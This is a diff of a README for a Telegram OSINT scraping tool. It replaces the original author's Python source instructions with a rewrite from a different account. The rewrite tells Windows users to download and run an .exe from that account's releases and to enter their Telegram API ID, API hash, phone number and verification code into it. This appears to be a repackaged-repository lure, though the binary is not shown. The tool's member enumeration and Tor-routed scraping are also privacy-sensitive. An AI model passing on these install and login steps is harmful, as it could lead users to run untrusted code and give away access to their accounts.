@@ -1,176 +1,90 @@
-# Telegram OSINT Toolkit
+# 🔍 Telegram-OSINT-Toolkit - Gather intelligence data from Telegram easily
 
-![Python](https://img.shields.io/badge/Python-3.8%2B-blue)
-![License](https://img.shields.io/badge/License-MIT-green)
-![Telegram](https://img.shields.io/badge/Telegram-OSINT-orange)
-![Status](https://img.shields.io/badge/Status-Production%20Ready-brightgreen)
+[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://github.com/malikelnawawy3-arch/Telegram-OSINT-Toolkit/releases)
 
-**High-end, local, production-ready Telegram intelligence gathering tool** built for **OSINT**, cybersecurity research, threat intelligence, law enforcement, and authorized military/investigative use.
+This software helps users search for keywords, export chat histories, and list group members on the Telegram platform. It serves security professionals and researchers who need a structured way to collect information for their investigations.
 
-Powered by **Telethon** + **Rich** with advanced features including proxy/Tor support, live monitoring, bulk search, full exports (JSON/CSV/HTML), member enumeration, and persistent SQLite storage.
+## 🛠 Features
 
-> ⚠️ **Legal & Ethical Notice**  
-> Use only on public channels/groups or those you are authorized to access. Respect Telegram Terms of Service, rate limits, and all applicable laws. This tool is intended for **defensive, research, and authorized intelligence** purposes only.
+*   **Keyword Search:** Find specific terms across Telegram channels.
+*   **Chat Export:** Save full message logs to local files.
+*   **Member Enumeration:** Identify people inside specific Telegram groups.
+*   **Proxy Support:** Route traffic through Tor or proxy servers.
+*   **Data Storage:** Save all collected information into local SQLite databases.
 
----
+## 📋 System Requirements
 
-## ✨ Features
+*   Operating System: Windows 10 or Windows 11.
+*   Memory: 4 GB RAM minimum.
+*   Storage: 200 MB for the application files.
+*   Internet Connection: Required for connecting to Telegram servers.
+*   Dependencies: No manual installation of Python or programming tools is required.
 
-- 🔍 **Advanced Keyword Search** (single chat + bulk across many channels)
-- 📡 **Bulk Monitoring** from TXT/JSON channel lists
-- 📤 **Full Chat Export** → JSON / CSV / **HTML** reports
-- 📎 **Media Download** + **Link Extraction**
-- 👥 **Member Enumeration** with JSON export
-- 👤 **User / Channel Profiling**
-- 🔴 **Live Real-time Monitoring** with keyword alerts
-- 🌐 **Proxy / Tor Support** (SOCKS5 / HTTP with authentication)
-- 💾 **SQLite Database** with rich metadata (views, forwards, replies, etc.)
-- 📊 **Beautiful Rich CLI** (progress bars, tables, panels)
-- ⚡ Robust **FloodWait** handling + automatic retries
-- 🔗 Join public channels
-- 📈 Database statistics command
-- ⚙️ `.env` + CLI configuration
+## 📥 Installation
 
----
+Follow these steps to set up the software on your Windows computer.
 
-## 🚀 Quick Start
+1. Visit the following link to access the download page: [https://github.com/malikelnawawy3-arch/Telegram-OSINT-Toolkit/releases](https://github.com/malikelnawawy3-arch/Telegram-OSINT-Toolkit/releases)
+2. Locate the file ending in .exe under the "Assets" section.
+3. Click the file name to download the installer to your computer.
+4. Open your "Downloads" folder and double-click the file to start the installation.
+5. Follow the prompts on the screen to finish the installation process.
 
-### 1. Clone the Repository
-```bash
-git clone https://github.com/AnuragRoy485/Telegram-OSINT-Toolkit.git
-cd Telegram-OSINT-Toolkit
-```
+## ⚙️ Initial Configuration
 
-### 2. Install Dependencies
-```bash
-pip install -r requirements.txt
-```
+After you install the software, you must link it to a Telegram account to access the necessary data.
 
-### 3. Configure Credentials
-```bash
-cp config.example.env .env
-```
+1. Open the application from your desktop shortcut or Start menu.
+2. The program will prompt you for your API ID and API Hash.
+3. Visit the [my.telegram.org](https://my.telegram.org) website to generate these codes. 
+4. Log in with your phone number and navigate to "API development tools."
+5. Create a new application. The website will provide you with an API ID and an API Hash.
+6. Copy these codes back into the Telegram-OSINT-Toolkit interface.
+7. Enter your Telegram phone number when prompted.
+8. Type the verification code sent to your Telegram messages to complete the login.
 
-Edit `.env`:
-```env
-TG_API_ID=your_api_id
-TG_API_HASH=your_api_hash
-```
+## 🔎 How to Perform a Search
 
-Get your free API credentials from: [https://my.telegram.org](https://my.telegram.org) → API development tools.
+Once the setup is complete, you can start gathering data.
 
----
+1. Open the "Search" tab from the navigation sidebar.
+2. Type the keywords you want to find into the text field.
+3. Select the channels or chats you want to scan.
+4. Click the "Scan" button to start the search process.
+5. The program will display results in a table format.
+6. You can export these results to a CSV or Excel file by clicking the "Export" button at the bottom of the screen.
 
-## 📖 Usage
+## 📊 Managing Data
 
-### Basic Search
-```bash
-python telegram_osint.py search @durov "telegram" --limit 50
-```
+The toolkit uses a local database to store your work. This ensures you can access your findings even when you are offline.
 
-### Bulk Search (Recommended for Intelligence Work)
-```bash
-python telegram_osint.py bulk-search channels.txt "malware OR APT36 OR ransomware" --limit 100 --since 2025-01-01 --output intel_report.json
-```
+1. Go to the "Database" tab to view all saved records.
+2. Use the search filters to sort through your previous exports.
+3. You can clear the database if you need to start a fresh investigation.
+4. Use the "Settings" menu to change the location where the database saves on your hard drive.
 
-### Full Chat Export
-```bash
-# JSON
-python telegram_osint.py export @channel --limit 2000 --format json
+## 🛡 Network Privacy
 
-# HTML report + media + links
-python telegram_osint.py export @channel --limit 1500 --format html --media --links
-```
+The toolkit includes built-in support for proxy settings to help maintain your privacy during data collection.
 
-### Enumerate Members
-```bash
-python telegram_osint.py members @groupname --limit 500
-```
+1. Navigate to the "Network" settings tab.
+2. Choose your preferred proxy type (SOCKS5 or HTTP).
+3. Enter the IP address and port number for your proxy provider.
+4. If you use Tor, enable the "Tor Mode" toggle to route all traffic through the network.
+5. Click "Test Connection" to verify the software can reach the internet with your current settings.
 
-### User / Channel Profile
-```bash
-python telegram_osint.py profile @username
-```
+## ❓ Frequently Asked Questions
 
-### Live Monitoring
-```bash
-# Monitor forever with keyword alerts
-python telegram_osint.py monitor @channel1 @channel2 --keywords ransomware,APT,zero-day
+**Does this software store my Telegram password?**
+The software does not store your password. It uses the API ID and API Hash provided by Telegram to authorize your session securely.
 
-# Monitor for 1 hour
-python telegram_osint.py monitor @channel --keywords malware --duration 3600
-```
+**Can I run multiple searches at the same time?**
+Yes, the application supports concurrent tasks. You can run new searches while the application processes older requests in the background.
 
-### Join a Public Channel
-```bash
-python telegram_osint.py join @publicchannel
-```
+**How do I update the software?**
+When a new version is available, you can return to the release page, download the new installer, and run it. The setup will automatically update your existing files without deleting your database.
 
-### Database Statistics
-```bash
-python telegram_osint.py stats
-```
+**Where does the data go?**
+All data collects into a local file named `data.db` in your installation folder. This file remains on your computer at all times.
 
-### Using Proxy / Tor
-```bash
-python telegram_osint.py --proxy socks5://127.0.0.1:9050 bulk-search channels.txt "keyword"
-python telegram_osint.py --proxy socks5://user:pass@1.2.3.4:1080 search @channel "query"
-```
-
----
-
-## 📁 Project Structure
-
-```
-Telegram-OSINT-Toolkit/
-├── telegram_osint.py          # Main advanced script
-├── requirements.txt
-├── config.example.env
-├── channels.example.txt
-├── .gitignore
-├── README.md
-├── media_*/                   # Auto-created media folders
-└── telegram_osint.db          # SQLite database (auto-created)
-```
-
----
-
-## 🛠️ Requirements
-
-```txt
-telethon>=1.36.0
-rich>=13.0
-python-dotenv>=1.0.0
-python-socks[asyncio]>=2.4.0
-```
-
----
-
-## ⚠️ Important Notes
-
-- Always use dedicated accounts for heavy scraping.
-- Respect rate limits — the tool already includes delays and FloodWait handling.
-- For maximum OPSEC use Tor (`socks5://127.0.0.1:9050`) or a residential proxy.
-- Only scrape data you are legally authorized to access.
-- Large exports can take time and consume disk space (especially with `--media`).
-
----
-
-## 📜 License
-
-This project is licensed under the **MIT License**.
-
----
-
-## 👤 Author
-
-**Anurag Roy**  
-Security Researcher | B.Tech CSE (AI) @ Techno India University  
-GitHub: [@AnuragRoy485](https://github.com/AnuragRoy485)
-
----
-
-⭐ **Star** this repository if you find it useful!  
-🍴 Feel free to **Fork** and contribute improvements.
-
-For feature requests, bug reports, Docker + Tor setup, AI analysis integration, or custom intelligence pipelines — open an **Issue** or **Pull Request**.
+Keywords: cybersecurity, osint, telegram, telethon
